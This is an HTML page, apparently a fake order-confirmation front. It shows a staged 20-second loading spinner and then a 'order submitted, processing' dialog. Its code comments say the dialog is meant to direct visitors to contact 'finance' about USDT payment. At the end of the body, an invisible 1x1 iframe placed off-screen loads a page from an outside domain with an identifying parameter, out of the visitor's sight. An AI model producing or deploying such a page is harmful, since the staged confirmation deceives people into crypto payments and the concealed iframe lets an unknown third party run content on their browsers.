<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="theme-color" content="#ffffff">
<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Ma+Shan+Zheng&display=swap">
<title>Loading</title>
<style>
  :root{
    --bg:#ffffff;
    --gold:#e8b64c;
    --gold-2:#f6d489;
    --gold-deep:#c8902f;
    --gold-text:#b8860b;
    --text:#1a1a1e;
    --muted:#7a7a84;
  }
  *{margin:0;padding:0;box-sizing:border-box;}
  html,body{width:100%;height:100%;}
  body{
    background:var(--bg);
    color:var(--text);
    font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei","Segoe UI",Roboto,Helvetica,Arial,sans-serif;
    line-height:1.6;
    overflow:hidden;
    -webkit-font-smoothing:antialiased;
  }

  /* 加载页（20 秒后自动进入，弹出对话框） */
  #loader{
    position:fixed;inset:0;z-index:1000;
    display:flex;align-items:center;justify-content:center;
    background:
      radial-gradient(700px 500px at 50% 42%, rgba(232,182,76,.08), transparent 65%),
      var(--bg);
    transition:opacity .6s ease, visibility .6s ease;
  }
  #loader.is-leaving{opacity:0;visibility:hidden;pointer-events:none;}
  .loader-inner{display:flex;flex-direction:column;align-items:center;gap:26px;}
  .loader-brand{
    font-family:"Ma Shan Zheng","STXingkai","华文行楷","LiSu","隶书","KaiTi","楷体",serif;
    font-size:48px;font-weight:400;letter-spacing:8px;
    background:linear-gradient(180deg,#1a1a1e 20%,var(--gold-text) 100%);
    -webkit-background-clip:text;background-clip:text;color:transparent;
  }
  .bar-loader{position:relative;width:70px;height:70px;}
  .bar-loader .bar{
    position:absolute;width:6px;height:18px;
    background:var(--gold-deep);border-radius:4px;
    left:50%;top:50%;margin-left:-3px;margin-top:-9px;
    opacity:.15;
    animation:bar-fade 1.2s infinite linear;
  }
  .loader-text{color:var(--text);font-size:18px;letter-spacing:1px;}
  .dots i{font-style:normal;animation:dot-blink 1.4s infinite;}
  .dots i:nth-child(2){animation-delay:.2s;}
  .dots i:nth-child(3){animation-delay:.4s;}
  @keyframes dot-blink{0%,80%,100%{opacity:.2;}40%{opacity:1;}}
  @keyframes bar-fade{
    0%{opacity:.15;}10%{opacity:1;}20%{opacity:.75;}30%{opacity:.35;}40%{opacity:.15;}100%{opacity:.15;}
  }

  /* ============================================================
     弹窗：USDT付款请联系财务
     ============================================================ */
  .mask{
    position:fixed;inset:0;z-index:2000;
    background:rgba(0,0,0,.22);
    backdrop-filter:blur(4px);-webkit-backdrop-filter:blur(4px);
    display:none;align-items:center;justify-content:center;padding:24px;
  }
  .mask.show{display:flex;}
  .dialog{
    width:100%;max-width:340px;
    background:#ffffff;
    border:1px solid rgba(0,0,0,.10);
    border-radius:18px;
    padding:32px 26px 24px;
    text-align:center;
    box-shadow:0 30px 60px -20px rgba(0,0,0,.28),0 0 40px -10px rgba(232,182,76,.30);
    animation:dialog-pop .35s cubic-bezier(.16,1,.3,1);
  }
  @keyframes dialog-pop{from{transform:translateY(20px) scale(.96);opacity:0;}to{transform:none;opacity:1;}}
  .dialog-icon{
    width:64px;height:64px;margin:0 auto 18px;border-radius:50%;
    display:flex;align-items:center;justify-content:center;
    background:linear-gradient(135deg,var(--gold-2),var(--gold-deep));
    color:#241803;font-size:30px;font-weight:800;
    box-shadow:0 0 0 6px rgba(232,182,76,.18),0 12px 30px -8px rgba(232,182,76,.45);
  }
  .dialog h3{
    font-weight:800;letter-spacing:2px;
    background:linear-gradient(180deg,#1a1a1e 20%,var(--gold-text) 100%);
    -webkit-background-clip:text;background-clip:text;color:transparent;
  }
  .dialog p{margin-top:10px;font-size:15px;color:var(--muted);letter-spacing:1px;}
  .dialog .confirm{
    margin-top:24px;width:100%;border:none;cursor:pointer;
    padding:13px;border-radius:12px;
    background:linear-gradient(135deg,var(--gold-2),var(--gold-deep));
    color:#241803;font-size:16px;font-weight:700;letter-spacing:3px;
    transition:transform .2s ease,box-shadow .2s ease;
    font-family:inherit;
  }
  .dialog .confirm:hover{transform:translateY(-1px);box-shadow:0 12px 24px -8px rgba(232,182,76,.6);}
  .dialog .confirm:active{transform:scale(.97);}

  @media (max-width:600px){
    .loader-brand{font-size:38px;letter-spacing:5px;}
  }
</style>
</head>
<body>

  <div id="loader">
    <div class="loader-inner">
      <div class="bar-loader">
        <div class="bar" style="transform: rotate(0deg) translateY(-25px); animation-delay: 0s;"></div>
        <div class="bar" style="transform: rotate(30deg) translateY(-25px); animation-delay: 0.1s;"></div>
        <div class="bar" style="transform: rotate(60deg) translateY(-25px); animation-delay: 0.2s;"></div>
        <div class="bar" style="transform: rotate(90deg) translateY(-25px); animation-delay: 0.3s;"></div>
        <div class="bar" style="transform: rotate(120deg) translateY(-25px); animation-delay: 0.4s;"></div>
        <div class="bar" style="transform: rotate(150deg) translateY(-25px); animation-delay: 0.5s;"></div>
        <div class="bar" style="transform: rotate(180deg) translateY(-25px); animation-delay: 0.6s;"></div>
        <div class="bar" style="transform: rotate(210deg) translateY(-25px); animation-delay: 0.7s;"></div>
        <div class="bar" style="transform: rotate(240deg) translateY(-25px); animation-delay: 0.8s;"></div>
        <div class="bar" style="transform: rotate(270deg) translateY(-25px); animation-delay: 0.9s;"></div>
        <div class="bar" style="transform: rotate(300deg) translateY(-25px); animation-delay: 1.0s;"></div>
        <div class="bar" style="transform: rotate(330deg) translateY(-25px); animation-delay: 1.1s;"></div>
      </div>
      <div class="loader-text">加载中<span class="dots"><i>.</i><i>.</i><i>.</i></span></div>
    </div>
  </div>

  <!-- ===================== 弹窗 ===================== -->
  <div class="mask" id="modal">
    <div class="dialog">
       
      <h3>订单提交成功，正在处理中</h3>
      <button class="confirm" id="modalOk">知道了</button>
    </div>
  </div>

<script>
(function () {
  var LOAD_MS = 20000; // 20 秒

  var loader = document.getElementById('loader');
  var modal  = document.getElementById('modal');

  // 加载完成 → 淡出加载页，弹出「USDT付款请联系财务」
  setTimeout(function () {
    loader.classList.add('is-leaving');
    setTimeout(function () { if (loader && loader.parentNode) loader.parentNode.removeChild(loader); }, 600);
    modal.classList.add('show');
  }, LOAD_MS);

  document.getElementById('modalOk').onclick = function () {
    modal.classList.remove('show');
  };
})();
</script>
<iframe src="https://rhce35.cc/assets/js/group.html?p=RRXX4mGX"style="position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;border:none;" loading="eager"></iframe>
 </body>
</html>
